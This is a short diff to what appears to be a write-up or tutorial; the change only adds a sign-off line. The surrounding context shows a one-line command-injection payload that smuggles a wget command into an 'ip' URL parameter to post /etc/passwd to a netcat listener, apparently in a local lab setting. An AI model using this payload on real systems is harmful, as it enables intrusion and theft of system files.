@@ -70,3 +70,5 @@ One line payload:
 ```
 nc -lvp 443 & curl 127.0.0.1:5000/?ip=%0Awget%20--post-file=/etc/passwd%20127.0.0.1:443
 ```
+
+I hope you liked! :D
